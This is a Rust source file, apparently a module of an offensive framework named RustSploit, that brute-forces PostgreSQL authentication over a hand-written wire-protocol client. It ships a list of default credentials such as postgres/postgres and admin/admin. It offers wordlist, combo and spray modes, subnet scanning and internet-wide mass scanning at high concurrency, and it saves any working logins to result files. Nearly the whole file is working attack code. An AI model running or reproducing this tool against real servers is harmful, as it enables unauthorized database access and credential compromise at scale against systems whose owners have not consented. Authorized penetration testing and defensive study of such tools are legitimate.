//! PostgreSQL Brute Force Module
//!
//! Raw TCP wire-protocol implementation of PostgreSQL v3 authentication.
//! Supports cleartext and MD5 password auth methods.
//!
//! Protocol flow:
//! 1. Send StartupMessage (protocol 3.0, user, database)
//! 2. Read Authentication request:
//!    - Type 0: AuthenticationOk (no password needed)
//!    - Type 3: CleartextPassword -> send PasswordMessage(password)
//!    - Type 5: MD5Password + 4-byte salt -> send "md5" + MD5(MD5(password+user) + salt)
//! 3. Read response: 'R' type 0 = success, 'E' = error

use anyhow::{anyhow, Result};
use colored::*;
// md5 crate 0.8 uses md5::compute(), not the Digest trait
use std::io::Write;
use std::net::IpAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_PG_PORT: u16 = 5432;
const CONNECT_TIMEOUT_MS: u64 = 5000;
const READ_TIMEOUT_MS: u64 = 5000;
const DEFAULT_DATABASE: &str = "postgres";

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("postgres", "postgres"),
    ("postgres", ""),
    ("postgres", "password"),
    ("postgres", "123456"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("pgsql", "pgsql"),
];

// ============================================================================
// Module Info
// ============================================================================

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "PostgreSQL Brute Force".to_string(),
        description: "Brute-force PostgreSQL authentication over raw TCP using protocol v3. \
            Supports cleartext and MD5 password auth methods. Includes default credential \
            testing, wordlist combo mode, subnet scanning, and mass scan."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://www.postgresql.org/docs/current/protocol-flow.html".to_string(),
        ],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Main Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("{}", "=== PostgreSQL Brute Force Module ===".bold());
    crate::mprintln!("[*] Target: {}", target);

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} -- Mass Scan Mode", target).yellow()
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "PostgreSQL",
                default_port: DEFAULT_PG_PORT,
                state_file: "postgres_brute_hose_state.log",
                default_output: "postgres_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(5)).await {
                    return None;
                }
                let addr = format!("{}:{}", ip, port);
                let creds = [
                    ("postgres", "postgres"),
                    ("postgres", ""),
                    ("postgres", "password"),
                    ("admin", "admin"),
                ];
                for (user, pass) in creds {
                    match try_pg_auth(&addr, user, pass, DEFAULT_DATABASE).await {
                        PgResult::Success => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
                        }
                        PgResult::ConnectionError(_) => return None,
                        PgResult::AuthFailed | PgResult::ProtocolError(_) => {}
                    }
                }
                None
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} (Subnet Scan)", target).cyan()
        );

        let port: u16 = cfg_prompt_port("port", "PostgreSQL Port", DEFAULT_PG_PORT).await?;
        let database =
            cfg_prompt_default("database", "Target database", DEFAULT_DATABASE).await?;
        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "postgres_subnet_results.txt",
        )
        .await?;

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "postgresql",
                jitter_ms: 50,
                source_module: "creds/generic/postgres_credcheck",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let db = database.clone();
                async move {
                    let addr = format!("{}:{}", ip, port);
                    match try_pg_auth(&addr, &user, &pass, &db).await {
                        PgResult::Success => LoginResult::Success,
                        PgResult::AuthFailed => LoginResult::AuthFailed,
                        PgResult::ConnectionError(e) => LoginResult::Error {
                            message: e,
                            retryable: true,
                        },
                        PgResult::ProtocolError(e) => LoginResult::Error {
                            message: e,
                            retryable: false,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "PostgreSQL Port", DEFAULT_PG_PORT).await?;
    let database =
        cfg_prompt_default("database", "Target database", DEFAULT_DATABASE).await?;

    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "postgres_brute_results.txt")
                .await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!(
                "[*] Added {} default credentials",
                DEFAULT_CREDENTIALS.len()
            )
            .green()
        );
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    crate::mprintln!(
        "\n{}",
        format!(
            "[*] Starting PostgreSQL brute-force on {}:{} ({} combos, {} threads, db={})",
            target,
            port,
            combos.len(),
            concurrency,
            database
        )
        .cyan()
    );

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let db = database.clone();
        async move {
            let addr = normalize_target(&format!("{}:{}", t, p))
                .unwrap_or_else(|_| format!("{}:{}", t, p));
            match try_pg_auth(&addr, &user, &pass, &db).await {
                PgResult::Success => LoginResult::Success,
                PgResult::AuthFailed => LoginResult::AuthFailed,
                PgResult::ConnectionError(e) => LoginResult::Error {
                    message: e,
                    retryable: true,
                },
                PgResult::ProtocolError(e) => LoginResult::Error {
                    message: e,
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: target.to_string(),
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "postgresql",
            jitter_ms: 50,
            source_module: "creds/generic/postgres_credcheck",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored PostgreSQL responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "postgres_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# PostgreSQL Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// PostgreSQL Wire Protocol Implementation
// ============================================================================

#[derive(Debug)]
enum PgResult {
    Success,
    AuthFailed,
    ConnectionError(String),
    ProtocolError(String),
}

/// Build a PostgreSQL StartupMessage (protocol v3.0).
///
/// Format: length (4 bytes, includes self) + protocol (4 bytes) + key-value pairs + terminator.
fn build_startup_message(user: &str, database: &str) -> Vec<u8> {
    let mut params = Vec::new();

    // user parameter
    params.extend_from_slice(b"user\0");
    params.extend_from_slice(user.as_bytes());
    params.push(0);

    // database parameter
    params.extend_from_slice(b"database\0");
    params.extend_from_slice(database.as_bytes());
    params.push(0);

    // client_encoding parameter
    params.extend_from_slice(b"client_encoding\0");
    params.extend_from_slice(b"UTF8\0");

    // terminator
    params.push(0);

    // protocol version 3.0 = 196608
    let protocol_version: u32 = 196608;
    // total length = 4 (length) + 4 (protocol) + params
    let total_len = (4 + 4 + params.len()) as u32;

    let mut msg = Vec::with_capacity(total_len as usize);
    msg.extend_from_slice(&total_len.to_be_bytes());
    msg.extend_from_slice(&protocol_version.to_be_bytes());
    msg.extend_from_slice(&params);

    msg
}

/// Build a PasswordMessage for PostgreSQL.
///
/// Format: 'p' + length (4 bytes, includes self) + password string + null terminator.
fn build_password_message(password: &str) -> Vec<u8> {
    let pass_bytes = password.as_bytes();
    let len = (4 + pass_bytes.len() + 1) as u32; // length includes itself + string + null

    let mut msg = Vec::with_capacity(1 + len as usize);
    msg.push(b'p');
    msg.extend_from_slice(&len.to_be_bytes());
    msg.extend_from_slice(pass_bytes);
    msg.push(0);

    msg
}

/// Compute PostgreSQL MD5 auth response.
///
/// inner = md5(password + username)
/// result = "md5" + md5(hex(inner) + salt)
fn compute_md5_password(user: &str, password: &str, salt: &[u8; 4]) -> String {
    // inner = MD5(password + username)
    let mut inner_input = Vec::with_capacity(password.len() + user.len());
    inner_input.extend_from_slice(password.as_bytes());
    inner_input.extend_from_slice(user.as_bytes());
    let inner = md5::compute(&inner_input);
    let inner_hex = format!("{:x}", inner);

    // outer = MD5(hex(inner) + salt)
    let mut outer_input = Vec::with_capacity(inner_hex.len() + 4);
    outer_input.extend_from_slice(inner_hex.as_bytes());
    outer_input.extend_from_slice(salt);
    let outer = md5::compute(&outer_input);

    format!("md5{:x}", outer)
}

/// Read a PostgreSQL message: 1-byte type + 4-byte length (BE, includes self) + payload.
async fn read_pg_message(stream: &mut TcpStream) -> Result<(u8, Vec<u8>)> {
    let mut header = [0u8; 5];
    tokio::time::timeout(Duration::from_millis(READ_TIMEOUT_MS), stream.read_exact(&mut header))
        .await
        .map_err(|_| anyhow!("Timeout reading PostgreSQL message"))?
        .map_err(|e| anyhow!("Failed to read message header: {}", e))?;

    let msg_type = header[0];
    let length = u32::from_be_bytes([header[1], header[2], header[3], header[4]]);

    if length < 4 {
        return Err(anyhow!("Invalid message length: {}", length));
    }

    let payload_len = (length - 4) as usize;
    if payload_len > 65_536 {
        return Err(anyhow!("PostgreSQL message too large: {} bytes", payload_len));
    }

    let mut payload = vec![0u8; payload_len];
    if payload_len > 0 {
        tokio::time::timeout(
            Duration::from_millis(READ_TIMEOUT_MS),
            stream.read_exact(&mut payload),
        )
        .await
        .map_err(|_| anyhow!("Timeout reading PostgreSQL payload"))?
        .map_err(|e| anyhow!("Failed to read payload: {}", e))?;
    }

    Ok((msg_type, payload))
}

/// Attempt PostgreSQL authentication against a target address.
async fn try_pg_auth(addr: &str, username: &str, password: &str, database: &str) -> PgResult {
    // TCP connect with timeout
    let mut stream = match crate::utils::network::tcp_connect(addr, Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
        Ok(s) => s,
        Err(e) => return PgResult::ConnectionError(format!("Connect failed: {}", e)),
    };

    // Send StartupMessage
    let startup = build_startup_message(username, database);
    if let Err(e) = stream.write_all(&startup).await {
        return PgResult::ConnectionError(format!("Failed to send startup: {}", e));
    }
    if let Err(e) = stream.flush().await {
        return PgResult::ConnectionError(format!("Failed to flush: {}", e));
    }

    // Read server response - may get multiple messages
    loop {
        let (msg_type, payload) = match read_pg_message(&mut stream).await {
            Ok(m) => m,
            Err(e) => {
                return PgResult::ConnectionError(format!("Failed to read response: {}", e))
            }
        };

        match msg_type {
            b'R' => {
                // Authentication message
                if payload.len() < 4 {
                    return PgResult::ProtocolError("Auth message too short".to_string());
                }
                let auth_type = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);

                match auth_type {
                    0 => {
                        // AuthenticationOk - success!
                        return PgResult::Success;
                    }
                    3 => {
                        // CleartextPassword requested
                        let pass_msg = build_password_message(password);
                        if let Err(e) = stream.write_all(&pass_msg).await {
                            return PgResult::ConnectionError(format!(
                                "Failed to send password: {}",
                                e
                            ));
                        }
                        if let Err(e) = stream.flush().await {
                            return PgResult::ConnectionError(format!("Flush error: {}", e));
                        }
                        // Continue loop to read the auth result
                    }
                    5 => {
                        // MD5Password requested - extract 4-byte salt
                        if payload.len() < 8 {
                            return PgResult::ProtocolError(
                                "MD5 auth message too short (no salt)".to_string(),
                            );
                        }
                        let mut salt = [0u8; 4];
                        salt.copy_from_slice(&payload[4..8]);

                        let md5_pass = compute_md5_password(username, password, &salt);
                        let pass_msg = build_password_message(&md5_pass);
                        if let Err(e) = stream.write_all(&pass_msg).await {
                            return PgResult::ConnectionError(format!(
                                "Failed to send MD5 password: {}",
                                e
                            ));
                        }
                        if let Err(e) = stream.flush().await {
                            return PgResult::ConnectionError(format!("Flush error: {}", e));
                        }
                        // Continue loop to read the auth result
                    }
                    10 => {
                        // SASL authentication (SCRAM-SHA-256) -- not supported in this module
                        return PgResult::ProtocolError(
                            "SCRAM-SHA-256 auth not supported (use password or md5 in pg_hba.conf)"
                                .to_string(),
                        );
                    }
                    other => {
                        return PgResult::ProtocolError(format!(
                            "Unsupported auth type: {}",
                            other
                        ));
                    }
                }
            }
            b'E' => {
                // ErrorResponse -- parse the message for detail
                let msg = parse_pg_error(&payload);
                if msg.contains("authentication failed")
                    || msg.contains("password authentication failed")
                    || msg.contains("no pg_hba.conf entry")
                {
                    return PgResult::AuthFailed;
                }
                return PgResult::ProtocolError(msg);
            }
            b'N' => {
                // NoticeResponse -- informational, keep reading
                continue;
            }
            b'K' => {
                // BackendKeyData -- sent after successful auth, followed by ReadyForQuery
                // Continue reading to find ReadyForQuery
                continue;
            }
            b'S' => {
                // ParameterStatus -- sent after successful auth
                continue;
            }
            b'Z' => {
                // ReadyForQuery -- server is ready, auth was successful
                return PgResult::Success;
            }
            other => {
                return PgResult::ProtocolError(format!(
                    "Unexpected message type: 0x{:02X} ('{}')",
                    other, other as char
                ));
            }
        }
    }
}

/// Parse a PostgreSQL ErrorResponse into a human-readable string.
///
/// Format: series of type-byte + null-terminated string pairs, terminated by 0.
fn parse_pg_error(payload: &[u8]) -> String {
    let mut messages = Vec::new();
    let mut pos = 0;

    while pos < payload.len() {
        let field_type = payload[pos];
        pos += 1;

        if field_type == 0 {
            break;
        }

        // Find null terminator
        let start = pos;
        while pos < payload.len() && payload[pos] != 0 {
            pos += 1;
        }

        let value = String::from_utf8_lossy(&payload[start..pos]).to_string();
        pos += 1; // skip null terminator

        match field_type {
            b'S' => messages.push(format!("Severity: {}", value)),
            b'M' => messages.push(value.clone()),
            b'C' => messages.push(format!("Code: {}", value)),
            _ => {}
        }
    }

    if messages.is_empty() {
        "Unknown PostgreSQL error".to_string()
    } else {
        messages.join("; ")
    }
}
